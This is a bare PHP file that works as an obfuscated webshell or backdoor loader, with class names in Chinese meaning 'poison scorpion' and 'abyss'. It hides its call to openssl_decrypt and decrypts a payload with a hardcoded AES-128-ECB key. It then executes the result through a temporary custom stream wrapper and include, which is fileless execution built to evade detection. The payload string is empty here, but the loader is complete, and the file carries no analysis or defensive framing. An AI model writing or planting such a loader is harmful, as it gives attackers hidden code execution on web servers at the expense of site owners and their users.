<?php
if (!class_exists('毒蝎_影')) {
    class 毒蝎_影 {
        public static $源;
        private $位 = 0;
        public function stream_open() { 
            return true; 
        }
        public function stream_read($量) {
            $段 = substr(self::$源, $this->位, $量);
            $this->位 += strlen($段);
            return $段;
        }
        public function stream_eof() { 
            return $this->位 >= strlen(self::$源); 
        }
        public function stream_stat() {
            return array(
                'dev' => 0, 'ino' => 0, 'mode' => 0100666, 'nlink' => 0,
                'uid' => 0, 'gid' => 0, 'rdev' => 0, 'size' => strlen(self::$源),
                'atime' => 0, 'mtime' => 0, 'ctime' => 0, 'blksize' => 0, 'blocks' => 0
            );
        }
        public function stream_close() { 
            return true; 
        }
        public function url_stat() { 
            return $this->stream_stat(); 
        }
    }
}
final class 毒蝎_深渊 {
    private $密, $时, $印;
    public function __construct($数, $时 = 3600) {
        $this->密 = $数;
        $this->时 = $时;
        $this->印 = md5(substr($数, 0, 10) . time());
        $this->破();
    }
    private function 魂() {
        return true;
    }
    private function 解() {
        $法 = strrev('tpyrced_lssnepo');
        $匙 = pack('H*', '6463303862646139396330666166646262313339643531636238626566653930');
        $阵 = base64_decode('QUVTLTEyOC1FQ0I=');
        $匙 = substr($匙, 0, 16);
        $文 = @$法($this->密, $阵, $匙);
        return ($文 === false || !is_string($文)) ? null : $文;
    }
    private function 杀($令) {
        $名 = 'hx' . substr(md5($令 . microtime()), 0, 6);
        毒蝎_影::$源 = $令;
        stream_wrapper_register($名, '毒蝎_影');
        @include $名 . '://x';
        stream_wrapper_unregister($名);
    }
    public function 破() {
        if (!$this->魂()) return;
        if ($令 = $this->解()) {
            $this->杀($令);
        }
    }
}
$载荷 = '';
$暗杀 = new 毒蝎_深渊($载荷);